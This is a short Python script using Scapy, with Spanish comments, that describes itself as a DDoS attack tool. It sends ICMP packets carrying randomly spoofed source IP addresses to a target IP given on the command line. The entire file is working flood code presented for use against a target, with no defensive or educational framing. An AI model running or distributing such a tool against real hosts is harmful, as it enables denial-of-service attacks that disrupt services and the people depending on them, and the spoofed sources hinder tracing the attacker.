#!/usr/bin/env python
from scapy.all import *
import argparse
import random

def send_icmp_packet(target, count):
    # Envía un paquete ICMP a la dirección IP de destino especificada
    for i in range(count):
        src_ip = '.'.join([str(random.randint(1, 254)) for _ in range(4)]) # Genera una dirección IP de origen aleatoria
        packet = IP(src=src_ip, dst=target)/ICMP()
        send(packet)

def main():
    # Configura los argumentos de línea de comandos
    parser = argparse.ArgumentParser(description='Realiza un ataque DDoS mediante el envío de paquetes ICMP a una dirección IP de destino')
    parser.add_argument('target', metavar='target', type=str, help='La dirección IP del objetivo de ataque')
    parser.add_argument('--count', metavar='count', type=int, default=10, help='El número de paquetes ICMP a enviar')
    args = parser.parse_args()

    # Envía los paquetes ICMP al objetivo de ataque
    send_icmp_packet(args.target, args.count)

    # Imprime un mensaje de confirmación en la consola
    print(f"Se han enviado {args.count} paquetes ICMP al objetivo de ataque {args.target}")

if __name__ == '__main__':
    main()
